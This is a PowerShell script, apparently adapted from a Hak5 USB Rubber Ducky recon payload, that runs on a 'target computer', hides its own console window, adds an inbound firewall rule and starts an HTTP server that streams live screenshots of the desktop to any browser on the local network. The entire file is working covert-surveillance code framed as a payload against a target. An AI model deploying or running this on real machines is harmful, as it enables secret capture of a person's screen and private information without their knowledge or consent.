<#
================================================= Beigeworm's Screen Stream over HTTP ==========================================================

SYNOPSIS
Start up a HTTP server and stream the desktop to a browser window on another device on the network.

USAGE
1. Run this script on target computer and note the URL provided
2. on another device on the same network, enter the provided URL in a browser window
3. Hold escape key on target for 5 seconds to exit screenshare.

#>

# I have added/changed some items to make it work for my circumstances
# Original: https://github.com/hak5/usbrubberducky-payloads/blob/master/payloads/library/recon/Screenshare-Over-LAN/Payload.txt

# Hide the powershell console (1 = yes)
$hide = 1

[Console]::BackgroundColor = "Black"
Clear-Host
[Console]::SetWindowSize(88,30)
[Console]::Title = "HTTP Screenshare"
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName PresentationCore,PresentationFramework
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()

# Define port number
if ($port.length -lt 1){
    Write-Host "Using default port.. (8080)" -ForegroundColor Green
    $port = 8080
}

Write-Host "Detecting primary network interface." -ForegroundColor DarkGray
$networkInterfaces = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' -and $_.InterfaceDescription -notmatch 'Virtual' }
$filteredInterfaces = $networkInterfaces | Where-Object { $_.InterfaceDescription -match 'Wi-Fi' -or  $_.InterfaceDescription -match 'Ethernet' }
$primaryInterface = $filteredInterfaces | Select-Object -First 1
if ($primaryInterface) {
    if ($primaryInterface.InterfaceDescription -match 'Wi-Fi') {
        Write-Output "Wi-Fi is the primary internet connection."
        $localIP = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $primaryInterface.Name | Select-Object -ExpandProperty IPAddress
    } elseif ($primaryInterface.Name -match 'Eth*') {
        Write-Output "Ethernet is the primary internet connection."
        $localIP = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Eth*" | Select-Object -ExpandProperty IPAddress
    } else {
        Write-Output "Unknown primary internet connection."
    }
    } else {Write-Output "No primary internet connection found."}

New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow | Out-Null
$webServer = New-Object System.Net.HttpListener 
$webServer.Prefixes.Add("http://"+$localIP+":$port/")
$webServer.Prefixes.Add("http://localhost:$port/")
$webServer.Start()
Write-Host ("Network Devices Can Reach the server at : http://"+$localIP+":$port") 
Write-Host "Press escape key for 5 seconds to exit" -f Cyan
Write-Host "Hiding this window.." -f Yellow
Start-Sleep -Seconds 4

# Code to hide the console on Windows 10 and 11
if ($hide -eq 1) {
    if (-not ([System.Management.Automation.PSTypeName]'Win32Functions.NativeWindow').Type) {
        $Win32Code = @'
        [DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
        [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
'@
        $Type = Add-Type -MemberDefinition $Win32Code -Name NativeWindow -Namespace Win32Functions -PassThru
    } else {
        $Type = [Win32Functions.NativeWindow]
    }
    
    $hwnd = $Type::GetConsoleWindow()
    
    if ($hwnd -and $hwnd -ne [System.IntPtr]::Zero) {
        $null = $Type::ShowWindowAsync($hwnd, 0) # 0 = SW_HIDE
    } else {
        # Secure fallback block preventing the null pointer exception completely
        try {
            $uniqueTitle = "hideme_$pid"
            $Host.UI.RawUI.WindowTitle = $uniqueTitle
            Start-Sleep -Milliseconds 150
            $Proc = Get-Process | Where-Object { $_.MainWindowTitle -eq $uniqueTitle } | Select-Object -First 1
            if ($Proc -and $Proc.MainWindowHandle -ne [System.IntPtr]::Zero) {
                $null = $Type::ShowWindowAsync($Proc.MainWindowHandle, 0)
            }
        } catch {}
    }
}

# Escape to exit key detection
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Keyboard
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
$VK_ESCAPE = 0x1B
$startTime = $null

while ($true) {
    try {
        $context = $webServer.GetContext()
        $response = $context.Response
        if ($context.Request.RawUrl -eq "/stream") {
            $response.ContentType = "multipart/x-mixed-replace; boundary=frame"
            $response.Headers.Add("Cache-Control", "no-cache")
            $boundary = "--frame"

            while ($context.Response.OutputStream.CanWrite) {
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen
                $bitmap = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($screen.Bounds.X, $screen.Bounds.Y, 0, 0, $screen.Bounds.Size)

                $stream = New-Object System.IO.MemoryStream
                $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
                $bitmap.Dispose()
                $graphics.Dispose()

                $bytes = $stream.ToArray()
                $stream.Dispose()

                $writer = [System.Text.Encoding]::ASCII.GetBytes("$boundary`r`nContent-Type: image/png`r`nContent-Length: $($bytes.Length)`r`n`r`n")
                $response.OutputStream.Write($writer, 0, $writer.Length)
                $response.OutputStream.Write($bytes, 0, $bytes.Length)
                $boundaryWriter = [System.Text.Encoding]::ASCII.GetBytes("`r`n")
                $response.OutputStream.Write($boundaryWriter, 0, $boundaryWriter.Length)

                Start-Sleep -Milliseconds 33 

                # Check for the escape key press to exit
                $isEscapePressed = [Keyboard]::GetAsyncKeyState($VK_ESCAPE) -lt 0
                if ($isEscapePressed) {
                    if (-not $startTime) {
                        $startTime = Get-Date
                    }
                    $elapsedTime = (Get-Date) - $startTime
                    if ($elapsedTime.TotalSeconds -ge 5) {
                        (New-Object -ComObject Wscript.Shell).Popup("Screenshare Closed.",3,"Information",0x0)
                        Remove-NetFirewallRule -DisplayName "AllowWebServer" -ErrorAction SilentlyContinue
                        Start-Sleep -Seconds 1
                        exit
                    }
                } else {
                    $startTime = $null
                }

            }
        } else {
            $response.ContentType = "text/html"
            $html = @"
            <!DOCTYPE html>
            <html>
            <head>
                <title>Streaming Video</title>
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                body {
                    background-color: black;
                    margin: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                }
                img {
                    width: 90vw;
                    height: auto;
                    max-width: 100%;
                    max-height: 100%;
                }
            </style>
            </head>
            <body>
                <img src='/stream' alt='Streaming Video' />
            </body>
            </html>
"@
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
            $response.OutputStream.Write($buffer, 0, $buffer.Length)
        }
        $response.Close()
    } catch {
        Write-Host "Error encountered: $_"
    }
}
$webServer.Stop()
